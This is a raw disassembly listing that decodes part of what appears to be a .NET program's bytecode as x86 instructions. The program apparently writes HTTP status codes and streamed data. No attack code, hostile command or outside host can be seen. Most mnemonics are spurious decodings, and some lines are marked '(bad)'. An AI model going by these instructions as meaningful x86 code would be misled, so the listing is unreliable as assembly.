  402b67:	4a                   	dec    %edx
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	0a 25 2d 06 26 28    	or     0x2826062d,%ah
  402b70:	40                   	inc    %eax
  402b71:	00 00                	add    %al,(%eax)
  402b73:	0a 73 4b             	or     0x4b(%ebx),%dh
  402b76:	00 00                	add    %al,(%eax)
  402b78:	0a 0c 00             	or     (%eax,%eax,1),%cl
  402b7b:	08 6f 4c             	or     %ch,0x4c(%edi)
  402b7e:	00 00                	add    %al,(%eax)
  402b80:	0a 0d 09 28 08 00    	or     0x82809,%cl
  402b86:	00 06                	add    %al,(%esi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	de 12                	ficoms (%edx)
  402b8c:	08 14 fe             	or     %dl,(%esi,%edi,8)
  402b8f:	01 13                	add    %edx,(%ebx)
  402b91:	06                   	push   %es
  402b92:	11 06                	adc    %eax,(%esi)
  402b94:	2d 07 08 6f 25       	sub    $0x256f0807,%eax
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	0a 00                	or     (%eax),%al
  402b9d:	dc 00                	faddl  (%eax)
  402b9f:	28 40 00             	sub    %al,0x0(%eax)
  402ba2:	00 0a                	add    %cl,(%edx)
  402ba4:	72 43                	jb     0x402be9
  402ba6:	02 00                	add    (%eax),%al
  402ba8:	70 6f                	jo     0x402c19
  402baa:	41                   	inc    %ecx
  402bab:	00 00                	add    %al,(%eax)
  402bad:	0a 13                	or     (%ebx),%dl
  402baf:	04 02                	add    $0x2,%al
  402bb1:	6f                   	outsl  %ds:(%esi),(%dx)
  402bb2:	42                   	inc    %edx
  402bb3:	00 00                	add    %al,(%eax)
  402bb5:	0a 20                	or     (%eax),%ah
  402bb7:	c8 00 00 00          	enter  $0x0,$0x0
  402bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  402bbc:	43                   	inc    %ebx
  402bbd:	00 00                	add    %al,(%eax)
  402bbf:	0a 00                	or     (%eax),%al
  402bc1:	02 6f 42             	add    0x42(%edi),%ch
  402bc4:	00 00                	add    %al,(%eax)
  402bc6:	0a 72 49             	or     0x49(%edx),%dh
  402bc9:	02 00                	add    (%eax),%al
  402bcb:	70 6f                	jo     0x402c3c
  402bcd:	44                   	inc    %esp
  402bce:	00 00                	add    %al,(%eax)
  402bd0:	0a 00                	or     (%eax),%al
  402bd2:	02 6f 42             	add    0x42(%edi),%ch
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	0a 11                	or     (%ecx),%dl
  402bd9:	04 8e                	add    $0x8e,%al
  402bdb:	69 6a 6f 45 00 00 0a 	imul   $0xa000045,0x6f(%edx),%ebp
  402be2:	00 02                	add    %al,(%edx)
  402be4:	6f                   	outsl  %ds:(%esi),(%dx)
  402be5:	42                   	inc    %edx
  402be6:	00 00                	add    %al,(%eax)
  402be8:	0a 6f 46             	or     0x46(%edi),%ch
  402beb:	00 00                	add    %al,(%eax)
  402bed:	0a 11                	or     (%ecx),%dl
  402bef:	04 16                	add    $0x16,%al
  402bf1:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  402bf4:	69 6f 47 00 00 0a 00 	imul   $0xa0000,0x47(%edi),%ebp
  402bfb:	02 6f 42             	add    0x42(%edi),%ch
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	0a 6f 46             	or     0x46(%edi),%ch
  402c03:	00 00                	add    %al,(%eax)
  402c05:	0a 6f 48             	or     0x48(%edi),%ch
  402c08:	00 00                	add    %al,(%eax)
  402c0a:	0a 00                	or     (%eax),%al
  402c0c:	dd f8                	(bad)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	00 02                	add    %al,(%edx)
  402c12:	6f                   	outsl  %ds:(%esi),(%dx)
  402c13:	3c 00                	cmp    $0x0,%al
  402c15:	00 0a                	add    %cl,(%edx)
  402c17:	6f                   	outsl  %ds:(%esi),(%dx)
  402c18:	3f                   	aas
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	0a 72 e1             	or     -0x1f(%edx),%dh
  402c1e:	01 00                	add    %eax,(%eax)
  402c20:	70 28                	jo     0x402c4a
  402c22:	11 00                	adc    %eax,(%eax)
  402c24:	00 0a                	add    %cl,(%edx)
  402c26:	2c 10                	sub    $0x10,%al
  402c28:	06                   	push   %es
  402c29:	72 5f                	jb     0x402c8a
  402c2b:	02 00                	add    (%eax),%al
  402c2d:	70 28                	jo     0x402c57
  402c2f:	11 00                	adc    %eax,(%eax)
  402c31:	00 0a                	add    %cl,(%edx)
  402c33:	16                   	push   %ss
  402c34:	fe 01                	incb   (%ecx)
  402c36:	2b 01                	sub    (%ecx),%eax
  402c38:	17                   	pop    %ss
  402c39:	00 13                	add    %dl,(%ebx)
  402c3b:	06                   	push   %es
  402c3c:	11 06                	adc    %eax,(%esi)
  402c3e:	2d 72 00 28 09       	sub    $0x9280072,%eax
  402c43:	00 00                	add    %al,(%eax)
  402c45:	06                   	push   %es
  402c46:	0d 28 40 00 00       	or     $0x4028,%eax
  402c4b:	0a 09                	or     (%ecx),%cl
  402c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4e:	41                   	inc    %ecx
  402c4f:	00 00                	add    %al,(%eax)
  402c51:	0a 13                	or     (%ebx),%dl
  402c53:	05 02 6f 42 00       	add    $0x426f02,%eax
  402c58:	00 0a                	add    %cl,(%edx)
  402c5a:	20 c8                	and    %cl,%al
  402c5c:	00 00                	add    %al,(%eax)
  402c5e:	00 6f 43             	add    %ch,0x43(%edi)
  402c61:	00 00                	add    %al,(%eax)
  402c63:	0a 00                	or     (%eax),%al
  402c65:	02 6f 42             	add    0x42(%edi),%ch
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	0a 72 71             	or     0x71(%edx),%dh
  402c6d:	02 00                	add    (%eax),%al
  402c6f:	70 6f                	jo     0x402ce0
  402c71:	44                   	inc    %esp
  402c72:	00 00                	add    %al,(%eax)
  402c74:	0a 00                	or     (%eax),%al
  402c76:	02 6f 42             	add    0x42(%edi),%ch
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 11                	or     (%ecx),%dl
  402c7d:	05 8e 69 6a 6f       	add    $0x6f6a698e,%eax
  402c82:	45                   	inc    %ebp
  402c83:	00 00                	add    %al,(%eax)
  402c85:	0a 00                	or     (%eax),%al
  402c87:	02 6f 42             	add    0x42(%edi),%ch
  402c8a:	00 00                	add    %al,(%eax)
  402c8c:	0a 6f 46             	or     0x46(%edi),%ch
  402c8f:	00 00                	add    %al,(%eax)
  402c91:	0a 11                	or     (%ecx),%dl
  402c93:	05 16 11 05 8e       	add    $0x8e051116,%eax
  402c98:	69 6f 47 00 00 0a 00 	imul   $0xa0000,0x47(%edi),%ebp
  402c9f:	02 6f 42             	add    0x42(%edi),%ch
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	0a 6f 46             	or     0x46(%edi),%ch
  402ca7:	00 00                	add    %al,(%eax)
  402ca9:	0a 6f 48             	or     0x48(%edi),%ch
  402cac:	00 00                	add    %al,(%eax)
  402cae:	0a 00                	or     (%eax),%al
  402cb0:	de 57 02             	ficoms 0x2(%edi)
  402cb3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb4:	42                   	inc    %edx
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	0a 20                	or     (%eax),%ah
  402cb9:	94                   	xchg   %eax,%esp
  402cba:	01 00                	add    %eax,(%eax)
  402cbc:	00 6f 43             	add    %ch,0x43(%edi)
  402cbf:	00 00                	add    %al,(%eax)
  402cc1:	0a 00                	or     (%eax),%al
  402cc3:	02 6f 42             	add    0x42(%edi),%ch
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	0a 6f 46             	or     0x46(%edi),%ch
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	0a 6f 48             	or     0x48(%edi),%ch
  402cd0:	00 00                	add    %al,(%eax)
  402cd2:	0a 00                	or     (%eax),%al
  402cd4:	00 de                	add    %bl,%dh
  402cd6:	31 26                	xor    %esp,(%esi)
  402cd8:	00 00                	add    %al,(%eax)
  402cda:	02 6f 42             	add    0x42(%edi),%ch
  402cdd:	00 00                	add    %al,(%eax)
  402cdf:	0a 20                	or     (%eax),%ah
  402ce1:	f4                   	hlt
  402ce2:	01 00                	add    %eax,(%eax)
  402ce4:	00 6f 43             	add    %ch,0x43(%edi)
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	0a 00                	or     (%eax),%al
  402ceb:	02 6f 42             	add    0x42(%edi),%ch
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	0a 6f 46             	or     0x46(%edi),%ch
  402cf3:	00 00                	add    %al,(%eax)
  402cf5:	0a 6f 48             	or     0x48(%edi),%ch
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 de                	add    %bl,%dh
  402cfe:	05 26 00 00 de       	add    $0xde000026,%eax
  402d03:	00 00                	add    %al,(%eax)
  402d05:	00 de                	add    %bl,%dh
  402d07:	00 00                	add    %al,(%eax)
  402d09:	00 2a                	add    %ch,(%edx)
  402d0b:	00 41 4c             	add    %al,0x4c(%ecx)
  402d0e:	00 00                	add    %al,(%eax)
  402d10:	02 00                	add    (%eax),%al
  402d12:	00 00                	add    %al,(%eax)
  402d14:	4e                   	dec    %esi
  402d15:	01 00                	add    %eax,(%eax)
  402d17:	00 12                	add    %dl,(%edx)
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	00 60 01             	add    %ah,0x1(%eax)
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	12 00                	adc    (%eax),%al
	...
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	ad                   	lods   %ds:(%esi),%eax
  402d2d:	02 00                	add    (%eax),%al
  402d2f:	00 26                	add    %ah,(%esi)
  402d31:	00 00                	add    %al,(%eax)
  402d33:	00 d3                	add    %dl,%bl
  402d35:	02 00                	add    (%eax),%al
  402d37:	00 05 00 00 00 01    	add    %al,0x1000000
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	01 00                	add    %eax,(%eax)
  402d41:	00 00                	add    %al,(%eax)
  402d43:	00 01                	add    %al,(%ecx)
  402d45:	00 00                	add    %al,(%eax)
  402d47:	00 aa 02 00 00 ab    	add    %ch,-0x54fffffe(%edx)
  402d4d:	02 00                	add    (%eax),%al
  402d4f:	00 31                	add    %dh,(%ecx)
  402d51:	00 00                	add    %al,(%eax)
  402d53:	00 01                	add    %al,(%ecx)
  402d55:	00 00                	add    %al,(%eax)
  402d57:	01 1b                	add    %ebx,(%ebx)
  402d59:	30 04 00             	xor    %al,(%eax,%eax,1)
  402d5c:	76 01                	jbe    0x402d5f
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	08 00                	or     %al,(%eax)
  402d62:	00 11                	add    %dl,(%ecx)
  402d64:	00 02                	add    %al,(%edx)
  402d66:	6f                   	outsl  %ds:(%esi),(%dx)
  402d67:	42                   	inc    %edx
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	0a 0a                	or     (%edx),%cl
  402d6c:	06                   	push   %es
  402d6d:	20 c8                	and    %cl,%al
  402d6f:	00 00                	add    %al,(%eax)
  402d71:	00 6f 43             	add    %ch,0x43(%edi)
  402d74:	00 00                	add    %al,(%eax)
  402d76:	0a 00                	or     (%eax),%al
  402d78:	06                   	push   %es
  402d79:	17                   	pop    %ss
  402d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d7b:	4d                   	dec    %ebp
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	0a 00                	or     (%eax),%al
  402d80:	06                   	push   %es
  402d81:	72 b1                	jb     0x402d34
  402d83:	02 00                	add    (%eax),%al
  402d85:	70 6f                	jo     0x402df6
  402d87:	44                   	inc    %esp
  402d88:	00 00                	add    %al,(%eax)
  402d8a:	0a 00                	or     (%eax),%al
  402d8c:	06                   	push   %es
  402d8d:	6f                   	outsl  %ds:(%esi),(%dx)
  402d8e:	4e                   	dec    %esi
  402d8f:	00 00                	add    %al,(%eax)
  402d91:	0a 72 05             	or     0x5(%edx),%dh
  402d94:	03 00                	add    (%eax),%eax
  402d96:	70 72                	jo     0x402e0a
  402d98:	21 03                	and    %eax,(%ebx)
  402d9a:	00 70 6f             	add    %dh,0x6f(%eax)
  402d9d:	4f                   	dec    %edi
  402d9e:	00 00                	add    %al,(%eax)
  402da0:	0a 00                	or     (%eax),%al
  402da2:	06                   	push   %es
  402da3:	6f                   	outsl  %ds:(%esi),(%dx)
  402da4:	4e                   	dec    %esi
  402da5:	00 00                	add    %al,(%eax)
  402da7:	0a 72 69             	or     0x69(%edx),%dh
  402daa:	03 00                	add    (%eax),%eax
  402dac:	70 72                	jo     0x402e20
  402dae:	77 03                	ja     0x402db3
  402db0:	00 70 6f             	add    %dh,0x6f(%eax)
  402db3:	4f                   	dec    %edi
  402db4:	00 00                	add    %al,(%eax)
  402db6:	0a 00                	or     (%eax),%al
  402db8:	06                   	push   %es
  402db9:	6f                   	outsl  %ds:(%esi),(%dx)
  402dba:	4e                   	dec    %esi
  402dbb:	00 00                	add    %al,(%eax)
  402dbd:	0a 72 89             	or     -0x77(%edx),%dh
  402dc0:	03 00                	add    (%eax),%eax
  402dc2:	70 72                	jo     0x402e36
  402dc4:	99                   	cltd
  402dc5:	03 00                	add    (%eax),%eax
  402dc7:	70 6f                	jo     0x402e38
  402dc9:	4f                   	dec    %edi
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	0a 00                	or     (%eax),%al
  402dce:	06                   	push   %es
  402dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd0:	46                   	inc    %esi
  402dd1:	00 00                	add    %al,(%eax)
  402dd3:	0a 0b                	or     (%ebx),%cl
  402dd5:	14 0c                	adc    $0xc,%al
  402dd7:	00 38                	add    %bh,(%eax)
  402dd9:	cc                   	int3
  402dda:	00 00                	add    %al,(%eax)
  402ddc:	00 00                	add    %al,(%eax)
  402dde:	16                   	push   %ss
  402ddf:	13 06                	adc    (%esi),%eax
  402de1:	7e 02                	jle    0x402de5
  402de3:	00 00                	add    %al,(%eax)
  402de5:	04 25                	add    $0x25,%al
  402de7:	13 07                	adc    (%edi),%eax
  402de9:	12 06                	adc    (%esi),%al
  402deb:	28 1b                	sub    %bl,(%ebx)
  402ded:	00 00                	add    %al,(%eax)
  402def:	0a 00                	or     (%eax),%al
  402df1:	00 7e 0b             	add    %bh,0xb(%esi)
  402df4:	00 00                	add    %al,(%eax)
  402df6:	04 0d                	add    $0xd,%al
  402df8:	00 de                	add    %bl,%dh
  402dfa:	14 11                	adc    $0x11,%al
  402dfc:	06                   	push   %es
  402dfd:	16                   	push   %ss
  402dfe:	fe 01                	incb   (%ecx)
  402e00:	13 08                	adc    (%eax),%ecx
  402e02:	11 08                	adc    %ecx,(%eax)
  402e04:	2d 08 11 07 28       	sub    $0x28071108,%eax
  402e09:	1c 00                	sbb    $0x0,%al
  402e0b:	00 0a                	add    %cl,(%edx)
  402e0d:	00 dc                	add    %bl,%ah
  402e0f:	00 09                	add    %cl,(%ecx)
  402e11:	2c 0b                	sub    $0xb,%al
  402e13:	09 8e 69 16 fe 01    	or     %ecx,0x1fe1669(%esi)
  402e19:	16                   	push   %ss
  402e1a:	fe 01                	incb   (%ecx)
  402e1c:	2b 01                	sub    (%ecx),%eax
  402e1e:	16                   	push   %ss
  402e1f:	00 13                	add    %dl,(%ebx)
  402e21:	08 11                	or     %dl,(%ecx)
  402e23:	08 2d 0b 00 1f 64    	or     %ch,0x641f000b
  402e29:	28 1d 00 00 0a 00    	sub    %bl,0xa0000
  402e2f:	2b 78 08             	sub    0x8(%eax),%edi
  402e32:	09 28                	or     %ebp,(%eax)
  402e34:	50                   	push   %eax
  402e35:	00 00                	add    %al,(%eax)
  402e37:	0a 16                	or     (%esi),%dl
  402e39:	fe 01                	incb   (%ecx)
  402e3b:	13 08                	adc    (%eax),%ecx
  402e3d:	11 08                	adc    %ecx,(%eax)
  402e3f:	2d 0b 00 1f 0a       	sub    $0xa1f000b,%eax
  402e44:	28 1d 00 00 0a 00    	sub    %bl,0xa0000
  402e4a:	2b 5d 09             	sub    0x9(%ebp),%ebx
  402e4d:	0c 72                	or     $0x72,%al
  402e4f:	9d                   	popf
  402e50:	03 00                	add    (%eax),%eax
  402e52:	70 09                	jo     0x402e5d
  402e54:	8e 69 8c             	mov    -0x74(%ecx),%gs
  402e57:	14 00                	adc    $0x0,%al
  402e59:	00 01                	add    %al,(%ecx)
  402e5b:	72 05                	jb     0x402e62
  402e5d:	04 00                	add    $0x0,%al
  402e5f:	70 28                	jo     0x402e89
  402e61:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  402e66:	04 28                	add    $0x28,%al
  402e68:	51                   	push   %ecx
  402e69:	00 00                	add    %al,(%eax)
  402e6b:	0a 11                	or     (%ecx),%dl
  402e6d:	04 6f                	add    $0x6f,%al
  402e6f:	41                   	inc    %ecx
  402e70:	00 00                	add    %al,(%eax)
  402e72:	0a 13                	or     (%ebx),%dl
  402e74:	05 07 11 05 16       	add    $0x16051107,%eax
  402e79:	11 05 8e 69 6f 47    	adc    %eax,0x476f698e
  402e7f:	00 00                	add    %al,(%eax)
  402e81:	0a 00                	or     (%eax),%al
  402e83:	07                   	pop    %es
  402e84:	09 16                	or     %edx,(%esi)
  402e86:	09 8e 69 6f 47 00    	or     %ecx,0x476f69(%esi)
  402e8c:	00 0a                	add    %cl,(%edx)
  402e8e:	00 07                	add    %al,(%edi)
  402e90:	1f                   	pop    %ds
  402e91:	0d 6f 52 00 00       	or     $0x526f,%eax
  402e96:	0a 00                	or     (%eax),%al
  402e98:	07                   	pop    %es
  402e99:	1f                   	pop    %ds
  402e9a:	0a 6f 52             	or     0x52(%edi),%ch
  402e9d:	00 00                	add    %al,(%eax)
  402e9f:	0a 00                	or     (%eax),%al
  402ea1:	07                   	pop    %es
  402ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea3:	53                   	push   %ebx
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	0a 00                	or     (%eax),%al
  402ea8:	00 fe                	add    %bh,%dh
  402eaa:	13 7e 01             	adc    0x1(%esi),%edi
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	04 13                	add    $0x13,%al
  402eb1:	08 11                	or     %dl,(%ecx)
  402eb3:	08 3a                	or     %bh,(%edx)
  402eb5:	24 ff                	and    $0xff,%al
  402eb7:	ff                   	(bad)
  402eb8:	ff 00                	incl   (%eax)
  402eba:	de 05 26 00 00 de    	fiadds 0xde000026
  402ec0:	00 00                	add    %al,(%eax)
  402ec2:	de 14 00             	ficoms (%eax,%eax,1)
  402ec5:	00 07                	add    %al,(%edi)
  402ec7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ec8:	48                   	dec    %eax
  402ec9:	00 00                	add    %al,(%eax)
  402ecb:	0a 00                	or     (%eax),%al
  402ecd:	00 de                	add    %bl,%dh
  402ecf:	05 26 00 00 de       	add    $0xde000026,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	00 dc                	add    %bl,%ah
  402ed8:	00 2a                	add    %ch,(%edx)
  402eda:	00 00                	add    %al,(%eax)
  402edc:	01 34 00             	add    %esi,(%eax,%eax,1)
  402edf:	00 02                	add    %al,(%edx)
  402ee1:	00 7d 00             	add    %bh,0x0(%ebp)
  402ee4:	1a 97 00 14 00 00    	sbb    0x1400(%edi),%dl
  402eea:	00 00                	add    %al,(%eax)
  402eec:	00 00                	add    %al,(%eax)
  402eee:	73 00                	jae    0x402ef0
  402ef0:	e5 58                	in     $0x58,%eax
  402ef2:	01 05 01 00 00 01    	add    %eax,0x1000001
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	61                   	popa
  402efb:	01 0b                	add    %ecx,(%ebx)
  402efd:	6c                   	insb   (%dx),%es:(%edi)
  402efe:	01 05 01 00 00 01    	add    %eax,0x1000001
  402f04:	02 00                	add    (%eax),%al
  402f06:	73 00                	jae    0x402f08
  402f08:	ed                   	in     (%dx),%eax
  402f09:	60                   	pusha
  402f0a:	01 14 00             	add    %edx,(%eax,%eax,1)
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	00 1b                	add    %bl,(%ebx)
  402f11:	30 04 00             	xor    %al,(%eax,%eax,1)
  402f14:	c5 03                	lds    (%ebx),%eax
  402f16:	00 00                	add    %al,(%eax)
  402f18:	09 00                	or     %eax,(%eax)
  402f1a:	00 11                	add    %dl,(%ecx)
  402f1c:	00 02                	add    %al,(%edx)
  402f1e:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402f22:	0a 16                	or     (%esi),%dl
  402f24:	fe 01                	incb   (%ecx)
  402f26:	13 11                	adc    (%ecx),%edx
  402f28:	11 11                	adc    %edx,(%ecx)
  402f2a:	2d 05 38 af 03       	sub    $0x3af3805,%eax
  402f2f:	00 00                	add    %al,(%eax)
  402f31:	02 72 0f             	add    0xf(%edx),%dh
  402f34:	04 00                	add    $0x0,%al
  402f36:	70 28                	jo     0x402f60
  402f38:	0d 00 00 06 0a       	or     $0xa060000,%eax
  402f3d:	06                   	push   %es
  402f3e:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  402f42:	0a 16                	or     (%esi),%dl
  402f44:	fe 01                	incb   (%ecx)
  402f46:	13 11                	adc    (%ecx),%edx
  402f48:	11 11                	adc    %edx,(%ecx)
  402f4a:	2d 05 38 8f 03       	sub    $0x38f3805,%eax
  402f4f:	00 00                	add    %al,(%eax)
  402f51:	16                   	push   %ss
  402f52:	13 10                	adc    (%eax),%edx
  402f54:	7e 02                	jle    0x402f58
  402f56:	00 00                	add    %al,(%eax)
  402f58:	04 25                	add    $0x25,%al
  402f5a:	13 12                	adc    (%edx),%edx
  402f5c:	12 10                	adc    (%eax),%dl
  402f5e:	28 1b                	sub    %bl,(%ebx)
  402f60:	00 00                	add    %al,(%eax)
  402f62:	0a 00                	or     (%eax),%al
  402f64:	00 7e 08             	add    %bh,0x8(%esi)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	04 0b                	add    $0xb,%al
  402f6b:	7e 09                	jle    0x402f76
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	04 0c                	add    $0xc,%al
  402f71:	00 de                	add    %bl,%dh
  402f73:	14 11                	adc    $0x11,%al
  402f75:	10 16                	adc    %dl,(%esi)
  402f77:	fe 01                	incb   (%ecx)
  402f79:	13 11                	adc    (%ecx),%edx
  402f7b:	11 11                	adc    %edx,(%ecx)
  402f7d:	2d 08 11 12 28       	sub    $0x28121108,%eax
  402f82:	1c 00                	sbb    $0x0,%al
  402f84:	00 0a                	add    %cl,(%edx)
  402f86:	00 dc                	add    %bl,%ah
  402f88:	00 07                	add    %al,(%edi)
  402f8a:	7e 13                	jle    0x402f9f
  402f8c:	00 00                	add    %al,(%eax)
  402f8e:	0a 28                	or     (%eax),%ch
  402f90:	14 00                	adc    $0x0,%al
  402f92:	00 0a                	add    %cl,(%edx)
  402f94:	16                   	push   %ss
  402f95:	fe 01                	incb   (%ecx)
  402f97:	13 11                	adc    (%ecx),%edx
  402f99:	11 11                	adc    %edx,(%ecx)
  402f9b:	2d 05 38 3e 03       	sub    $0x33e3805,%eax
  402fa0:	00 00                	add    %al,(%eax)
  402fa2:	02 72 19             	add    0x19(%edx),%dh
  402fa5:	04 00                	add    $0x0,%al
  402fa7:	70 16                	jo     0x402fbf
  402fa9:	28 0e                	sub    %cl,(%esi)
  402fab:	00 00                	add    %al,(%eax)
  402fad:	06                   	push   %es
  402fae:	0d 02 72 1d 04       	or     $0x41d7202,%eax
  402fb3:	00 70 16             	add    %dh,0x16(%eax)
  402fb6:	28 0e                	sub    %cl,(%esi)
  402fb8:	00 00                	add    %al,(%eax)
  402fba:	06                   	push   %es
  402fbb:	13 04 02             	adc    (%edx,%eax,1),%eax
  402fbe:	72 21                	jb     0x402fe1
  402fc0:	04 00                	add    $0x0,%al
  402fc2:	70 28                	jo     0x402fec
  402fc4:	0d 00 00 06 13       	or     $0x13060000,%eax
  402fc9:	05 09 11 04 28       	add    $0x28041109,%eax
  402fce:	0a 00                	or     (%eax),%al
  402fd0:	00 06                	add    %al,(%esi)
  402fd2:	13 06                	adc    (%esi),%eax
  402fd4:	12 02                	adc    (%edx),%al
  402fd6:	7b 2b                	jnp    0x403003
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	04 09                	add    $0x9,%al
  402fdc:	58                   	pop    %eax
  402fdd:	13 07                	adc    (%edi),%eax
  402fdf:	12 02                	adc    (%edx),%al
  402fe1:	7b 2c                	jnp    0x40300f
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	04 11                	add    $0x11,%al
  402fe7:	04 58                	add    $0x58,%al
  402fe9:	13 08                	adc    (%eax),%ecx
  402feb:	11 07                	adc    %eax,(%edi)
  402fed:	11 08                	adc    %ecx,(%eax)
  402fef:	28 0a                	sub    %cl,(%edx)
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	13 09                	adc    (%ecx),%ecx
  402ff6:	06                   	push   %es
  402ff7:	13 13                	adc    (%ebx),%edx
  402ff9:	11 13                	adc    %edx,(%ebx)
  402ffb:	39 e0                	cmp    %esp,%eax
  402ffd:	02 00                	add    (%eax),%al
  402fff:	00 fe                	add    %bh,%dh
  403001:	13 7e 31             	adc    0x31(%esi),%edi
  403004:	00 00                	add    %al,(%eax)
  403006:	04 2d                	add    $0x2d,%al
  403008:	6d                   	insl   (%dx),%es:(%edi)
  403009:	1e                   	push   %ds
  40300a:	73 55                	jae    0x403061
  40300c:	00 00                	add    %al,(%eax)
  40300e:	0a 25 72 2f 04 00    	or     0x42f72,%ah
  403014:	70 16                	jo     0x40302c
  403016:	28 56 00             	sub    %dl,0x0(%esi)
  403019:	00 0a                	add    %cl,(%edx)
  40301b:	25 72 43 04 00       	and    $0x44372,%eax
  403020:	70 17                	jo     0x403039
  403022:	28 56 00             	sub    %dl,0x0(%esi)
  403025:	00 0a                	add    %cl,(%edx)
  403027:	25 72 57 04 00       	and    $0x45772,%eax
  40302c:	70 18                	jo     0x403046
  40302e:	28 56 00             	sub    %dl,0x0(%esi)
  403031:	00 0a                	add    %cl,(%edx)
  403033:	25 72 67 04 00       	and    $0x46772,%eax
  403038:	70 19                	jo     0x403053
  40303a:	28 56 00             	sub    %dl,0x0(%esi)
  40303d:	00 0a                	add    %cl,(%edx)
  40303f:	25 72 73 04 00       	and    $0x47372,%eax
  403044:	70 1a                	jo     0x403060
  403046:	28 56 00             	sub    %dl,0x0(%esi)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	25 72 81 04 00       	and    $0x48172,%eax
  403050:	70 1b                	jo     0x40306d
  403052:	28 56 00             	sub    %dl,0x0(%esi)
  403055:	00 0a                	add    %cl,(%edx)
  403057:	25 72 91 04 00       	and    $0x49172,%eax
  40305c:	70 1c                	jo     0x40307a
  40305e:	28 56 00             	sub    %dl,0x0(%esi)
  403061:	00 0a                	add    %cl,(%edx)
  403063:	25 72 9d 04 00       	and    $0x49d72,%eax
  403068:	70 1d                	jo     0x403087
  40306a:	28 56 00             	sub    %dl,0x0(%esi)
  40306d:	00 0a                	add    %cl,(%edx)
  40306f:	fe                   	(bad)
  403070:	13 80 31 00 00 04    	adc    0x4000031(%eax),%eax
  403076:	fe                   	(bad)
  403077:	13 7e 31             	adc    0x31(%esi),%edi
  40307a:	00 00                	add    %al,(%eax)
  40307c:	04 11                	add    $0x11,%al
  40307e:	13 12                	adc    (%edx),%edx
  403080:	14 28                	adc    $0x28,%al
  403082:	57                   	push   %edi
  403083:	00 00                	add    %al,(%eax)
  403085:	0a 39                	or     (%ecx),%bh
  403087:	55                   	push   %ebp
  403088:	02 00                	add    (%eax),%al
  40308a:	00 11                	add    %dl,(%ecx)
  40308c:	14 45                	adc    $0x45,%al
  40308e:	08 00                	or     %al,(%eax)
  403090:	00 00                	add    %al,(%eax)
  403092:	05 00 00 00 22       	add    $0x22000000,%eax
  403097:	00 00                	add    %al,(%eax)
  403099:	00 70 00             	add    %dh,0x0(%eax)
  40309c:	00 00                	add    %al,(%eax)
  40309e:	bc 00 00 00 3e       	mov    $0x3e000000,%esp
  4030a3:	01 00                	add    %eax,(%eax)
  4030a5:	00 88 01 00 00 be    	add    %cl,-0x41ffffff(%eax)
  4030ab:	01 00                	add    %eax,(%eax)
  4030ad:	00 f4                	add    %dh,%ah
  4030af:	01 00                	add    %eax,(%eax)
  4030b1:	00 38                	add    %bh,(%eax)
  4030b3:	29 02                	sub    %eax,(%edx)
  4030b5:	00 00                	add    %al,(%eax)
  4030b7:	07                   	pop    %es
  4030b8:	20 00                	and    %al,(%eax)
  4030ba:	02 00                	add    (%eax),%al
  4030bc:	00 7e 13             	add    %bh,0x13(%esi)
  4030bf:	00 00                	add    %al,(%eax)
  4030c1:	0a 11                	or     (%ecx),%dl
  4030c3:	06                   	push   %es
  4030c4:	73 58                	jae    0x40311e
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	0a 28                	or     (%eax),%ch
  4030ca:	1c 00                	sbb    $0x0,%al
  4030cc:	00 06                	add    %al,(%esi)
  4030ce:	26 38 0c 02          	cmp    %cl,%es:(%edx,%eax,1)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	11 05 72 a7 04 00    	adc    %eax,0x4a772
  4030da:	70 28                	jo     0x403104
  4030dc:	11 00                	adc    %eax,(%eax)
  4030de:	00 0a                	add    %cl,(%edx)
  4030e0:	16                   	push   %ss
  4030e1:	fe 01                	incb   (%ecx)
  4030e3:	13 11                	adc    (%ecx),%edx
  4030e5:	11 11                	adc    %edx,(%ecx)
  4030e7:	2d 1b 07 20 04       	sub    $0x420071b,%eax
  4030ec:	02 00                	add    (%eax),%al
  4030ee:	00 18                	add    %bl,(%eax)
